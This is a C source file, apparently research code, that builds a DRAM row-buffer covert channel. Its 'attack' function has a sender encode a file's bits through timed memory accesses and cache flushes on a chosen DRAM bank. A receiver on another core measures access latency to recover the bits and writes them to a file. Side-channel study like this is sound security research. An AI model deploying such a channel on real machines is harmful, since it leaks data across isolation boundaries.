#include <ctime>
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/sysinfo.h>
#include <sys/mman.h>
#include <string.h>
#include <sched.h>

#include "cacheutils.h"

/* #define VERBOSE */

#define THRESHOLD 360

typedef struct {
    size_t virt, phys;
    size_t timing;
} addr_t;

size_t physmem() {
    struct sysinfo info;
    sysinfo(&info);
    return (size_t) info.totalram * (size_t) info.mem_unit;
}

size_t measure_single(size_t first) {
    size_t min_res = (-1ull);
    int num_reads = 100;
    uint64_t sum = 0;
    for (int i = 0; i < 3; i++) {
        size_t number_of_reads = num_reads;

        asm volatile("clflush (%0)" : : "r" (first) : "memory");

        size_t res = (size_t)-1;
        sched_yield();
        while (number_of_reads-- > 0) {
            size_t t0 = rdtsc();
            maccess((void*)first);
            size_t delta = rdtsc() - t0;
            if(delta < res) res = delta;

            // FIXME: change threshold if other microarchitecture used
            if (delta < 500) {
                sum += delta;
            } else {
                number_of_reads++;
            }

            asm volatile("clflush (%0)" : : "r" (first) : "memory");

            for(int n = 0; n < 1000; n++) asm volatile("nop");
        }

        if (res < min_res)
            min_res = res;
    }
    return sum / (3*num_reads);
}

size_t get_dram_row(size_t phys_addr) {
  return phys_addr >> 18;
}

size_t get_dram_mapping(size_t phys_addr) {
  static const size_t h0[] = {  7, 14 };
  static const size_t h1[] = { 15, 18 };
  static const size_t h2[] = { 16, 19 };
  static const size_t h3[] = { 17, 20 };
  static const size_t h4[] = { 8, 9, 12, 13, 15, 16 };

  size_t count = sizeof(h0) / sizeof(h0[0]);
  size_t hash = 0;
  for (size_t i = 0; i < count; i++) {
    hash ^= (phys_addr >> h0[i]) & 1;
  }
  count = sizeof(h1) / sizeof(h1[0]);
  size_t hash1 = 0;
  for (size_t i = 0; i < count; i++) {
    hash1 ^= (phys_addr >> h1[i]) & 1;
  }
  count = sizeof(h2) / sizeof(h2[0]);
  size_t hash2 = 0;
  for (size_t i = 0; i < count; i++) {
    hash2 ^= (phys_addr >> h2[i]) & 1;
  }
  count = sizeof(h3) / sizeof(h3[0]);
  size_t hash3 = 0;
  for (size_t i = 0; i < count; i++) {
    hash3 ^= (phys_addr >> h3[i]) & 1;
  }
  count = sizeof(h4) / sizeof(h4[0]);
  size_t hash4 = 0;
  for (size_t i = 0; i < count; i++) {
    hash4 ^= (phys_addr >> h4[i]) & 1;
  }
  return (hash4 << 4) | (hash3 << 3) | (hash2 << 2) | (hash1 << 1) | hash;
}

void pin_to_core(int core) {
    if(core == -1) {
        int current_cpu = sched_getcpu();
        if(current_cpu == -1) return;
        core = current_cpu;
    }

    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);

    sched_setaffinity(getpid(), sizeof(cpu_set_t), &cpu_set);
}

size_t virt_to_phys(void* virt, void* mapping_physical, uint64_t offset) {
#ifdef DEBUG_ULTRA_FAST_MODE
    return get_physical_address((size_t)virt);
#else
    return (size_t)mapping_physical+offset;
#endif
}

void* find_virt_in_set(void* mapping, uint64_t mapping_size, void* mapping_physical, int set) {
    size_t base_set;
    size_t base_row;
    uint64_t offset = 0;
    void* base;
    size_t phys;
    do {
        base = (mapping+offset);
        phys = virt_to_phys(base, mapping_physical, offset);
        base_set = get_dram_mapping(phys);
        base_row = get_dram_row(phys);
        offset += 64;
        /* printf("virt %p phys %p\n", base, phys); */
        /* printf("base set %d base_row %d\n", base_set, base_row); */
        assert(offset < mapping_size);
        // NOTE: The row shouldn't be the same for sender and receiver because the buffers we use
        // are rather large and distinct so should fill entire rows.
        // If that is not the case we can just rely on luck here. There are many rows...
    } while (base_set != set);
    printf("virt %p phys %p\n", base, phys);
    printf("base set %d base_row %d\n", base_set, base_row);
    return base;
}

char* read_file_to_buffer(const char* filename) {
    FILE* file = fopen(filename, "r");
    if (file == NULL) {
        perror("Failed to open file");
        return NULL;
    }

    // Go to the end of the file to determine its size
    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    rewind(file);

    // Allocate memory for the buffer (including space for the null terminator)
    char* buffer = (char*)malloc((file_size + 1) * sizeof(char));
    if (buffer == NULL) {
        perror("Failed to allocate buffer");
        fclose(file);
        return NULL;
    }

    // Read the file into the buffer
    size_t read_size = fread(buffer, 1, file_size, file);
    buffer[read_size] = '\0';  // Null-terminate the string

    // Clean up and close the file
    fclose(file);

    return buffer;
}

long long get_time() {
    struct timespec ts;
    clock_gettime(CLOCK_REALTIME, &ts);
    return ts.tv_sec * 1000LL + ts.tv_nsec / 1000000;
}

void write_to_file(const char *filename, const char *buffer, int n, int time) {
    FILE *file = fopen(filename, "wb");
    assert(file);
    int r = fwrite(buffer, sizeof(char), n, file);
    assert(r == n);
    fputc('\n', file);
    fprintf(file, "%d", time);
    fclose(file);
}

void attack(char* sendfile, char* outfile, int nbytes, void* mapping, uint64_t mapping_size, void* mapping_physical) {
    printf("mapping: %p, mapping_size: %p, mapping_physical: %p\n", mapping, mapping_size, mapping_physical);
#ifdef DEBUG_ULTRA_FAST_MODE
    uint64_t INITAL_SYNC = 50000000000;
#else
    uint64_t INITAL_SYNC = 50000000000;
#endif
    uint64_t SPEED = 3000000;

    #define SENDING_SET 0

    addr_t base;
        if (sendfile) {
            char* send = read_file_to_buffer(sendfile);
            int sendlen;
            if (nbytes == 0) {
                sendlen = strlen(send)+1;
            } else {
                sendlen = nbytes;
            }

            // NOTE: This is super important as framework pins us to the same core otherwise
            pin_to_core(0);
            void* base = find_virt_in_set(mapping, mapping_size, mapping_physical, SENDING_SET);

#ifndef DEBUG_ULTRA_FAST_MODE
            printf("waiting for input\n");
            getchar();
#endif

#ifdef VERBOSE
            for (int i=0; i<sendlen; i++) {
                printf("%02x", send[i]);
            }
            printf("\n");
#endif
            int b = rdtsc() / INITAL_SYNC;
#ifdef VERBOSE
            printf("target sender: %d\n", b+1);
#endif
            while (b+1 > (rdtsc() / INITAL_SYNC)) {
            }
            uint64_t timeslot_sub = rdtsc()/SPEED;
            printf("start sender\n");

            uint64_t timeslot = 0;
            while (timeslot/8 < sendlen) {
                unsigned char c = send[timeslot/8];
                int bit = (c >> (timeslot%8)) & 1;
#ifdef VERBOSE
                printf("Bit: %d (c=%d)\n", bit, c);
#endif

                uint64_t new_timeslot = timeslot;
                while (new_timeslot == timeslot) {
                    if (bit) {
                        // Keep sending row open
                        maccess((void*)base);
                        flush((void*)base);
                    }
                    new_timeslot = rdtsc()/SPEED-timeslot_sub;
                }
                timeslot = new_timeslot;
            }

            printf("stop sender\n");
        } else {
            // NOTE: This is super important as framework pins us to the same core otherwise
            pin_to_core(4);
            void* base = find_virt_in_set(mapping, mapping_size, mapping_physical, SENDING_SET);

#ifndef DEBUG_ULTRA_FAST_MODE
            printf("waiting for input\n");
            getchar();
#endif

            char* received = (char*)malloc(100<<20);
            int b = rdtsc() / INITAL_SYNC;
#ifdef VERBOSE
            printf("target recv: %d\n", b+1);
#endif
            while (b+1 > (rdtsc() / INITAL_SYNC)) {
            }
            uint64_t timeslot_sub = rdtsc()/SPEED;
            printf("start recver\n");

            int start = get_time();
            uint64_t timeslot = 0;
            while (1) {
                size_t check1 = measure_single((uint64_t)base);
    #ifdef VERBOSE
                printf("Bit %d: %ld %s %d\n", timeslot, check1, (check1 >= THRESHOLD) ? "≥" : "<" , THRESHOLD);
    #endif
                if (check1 >= THRESHOLD) {
                    received[timeslot/8] ^= 1 << (timeslot%8);
                }
                uint64_t new_timeslot = timeslot;
                while (new_timeslot == timeslot) {
                    new_timeslot = rdtsc()/SPEED-timeslot_sub;
                }
                timeslot = new_timeslot;

/* #ifdef VERBOSE */
/*                 printf("received 0x%02X at %d\n", recv, t-1); */
/* #endif */

                assert(timeslot/8 < (100<<20));
                if (timeslot/8 == nbytes) {
                    break;
                }
            }
            printf("stop receiver\n");
            int tt = get_time()-start;
            if (outfile) {
                write_to_file(outfile, received, timeslot/8, tt);
            }
        }
}
